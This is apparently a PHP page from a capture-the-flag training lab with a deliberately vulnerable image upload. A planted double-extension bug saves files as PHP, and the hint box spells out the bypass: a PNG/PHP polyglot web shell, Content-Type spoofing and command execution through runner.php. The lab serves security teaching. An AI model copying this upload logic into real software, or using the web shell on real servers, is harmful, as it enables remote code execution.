<?php
session_start();
loadEnv(__DIR__ . '/../.env');

function loadEnv($path) {
    if (!file_exists($path)) return;
    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
    }
}

// Check QA mode (set by Stage 4)
if (!isset($_SESSION['qa']) || $_SESSION['qa'] !== 1) {
    die('<h1>Access Denied</h1><p>QA Mode not enabled. Complete Stage 4 first.</p>');
}

$message = '';
$uploaded_file = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $upload_dir = __DIR__ . '/uploads/';
    
    // Layer 1: Content-Type check (weak - trusts client)
    $content_type = $file['type'];
    if ($content_type !== 'image/png' && $content_type !== 'image/jpeg') {
        $message = 'Error: Only PNG and JPEG images allowed (Content-Type check)';
    } else {
        // Layer 2: Extension check (weak - only checks last extension)
        $filename = $file['name'];
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        if (!in_array($ext, ['jpg', 'jpeg', 'png', 'gif'])) {
            $message = 'Error: Invalid file extension';
        } else {
            // Layer 3: Magic bytes check with finfo
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_file($finfo, $file['tmp_name']);
            finfo_close($finfo);
            
            if (!in_array($mime, ['image/png', 'image/jpeg', 'image/gif'])) {
                $message = 'Error: File content does not match image format';
            } else {
                // BUG: Normalize filename but save with FIRST extension
                // Example: shell.php.jpg -> extracts 'php' as first extension
                $parts = explode('.', $filename);
                if (count($parts) > 2) {
                    // Double extension detected - take FIRST extension (bug!)
                    $normalized_ext = $parts[1];
                    $base_name = $parts[0];
                    $final_name = $base_name . '.' . $normalized_ext;
                } else {
                    $final_name = $filename;
                }
                
                $target_path = $upload_dir . $final_name;
                
                if (move_uploaded_file($file['tmp_name'], $target_path)) {
                    $uploaded_file = $final_name;
                    $message = "Success! File uploaded as: $final_name";
                    
                    // Check if this completes Stage 5
                    if (strpos($final_name, '.php') !== false) {
                        $_SESSION['progress'] = max($_SESSION['progress'] ?? 0, 5);
                    }
                } else {
                    $message = 'Error: Failed to save file';
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Upload - LOCTH Lab</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container">
        <h1>📤 QA File Upload</h1>
        <p>Welcome to the QA testing area. Upload files for testing.</p>
        
        <?php if ($message): ?>
        <div class="<?php echo strpos($message, 'Success') !== false ? 'success-box' : 'error-box'; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
        <?php endif; ?>
        
        <?php if ($uploaded_file): ?>
        <div class="info-box">
            <strong>File uploaded successfully!</strong><br>
            Filename: <code><?php echo htmlspecialchars($uploaded_file); ?></code><br><br>
            <strong>Next step:</strong> Use runner.php to execute it<br>
            Example: <code>/runner.php?f=<?php echo urlencode($uploaded_file); ?>&cmd=id</code>
        </div>
        <?php endif; ?>
        
        <form method="POST" enctype="multipart/form-data" class="upload-form">
            <div class="form-group">
                <label>Select file to upload:</label>
                <input type="file" name="file" required>
            </div>
            <button type="submit" class="btn">Upload</button>
        </form>
        
        <div class="hint-box">
            <strong>Stage 5 Hints:</strong>
            <ul>
                <li>Layer 1 checks <code>Content-Type</code> - spoof it to <code>image/png</code></li>
                <li>Layer 2 checks file extension - use double extension like <code>shell.php.jpg</code></li>
                <li>Layer 3 checks magic bytes - prepend PNG header: <code>\x89PNG\r\n\x1a\n</code></li>
                <li>Bug: The system saves files with the FIRST extension from double extensions</li>
                <li>Create a polyglot: PNG magic bytes + PHP code</li>
                <li>After upload, use <code>runner.php</code> to execute commands</li>
            </ul>
            
            <strong>Example PHP Payload:</strong>
            <pre>&lt;?php system($_GET['cmd']); ?&gt;</pre>
            
            <strong>How to create the exploit file:</strong>
            <pre>
# Create polyglot file with PNG magic bytes + PHP code
echo -e '\x89PNG\r\n\x1a\n&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php.jpg

# Modify Content-Type in Burp Suite to: image/png
# Upload via form
# Access via: /runner.php?f=shell.php&cmd=cat%20../flags/final_flag.txt
            </pre>
        </div>
        
        <a href="flow.php" class="btn-secondary">Back to Flow</a>
    </div>
</body>
</html>
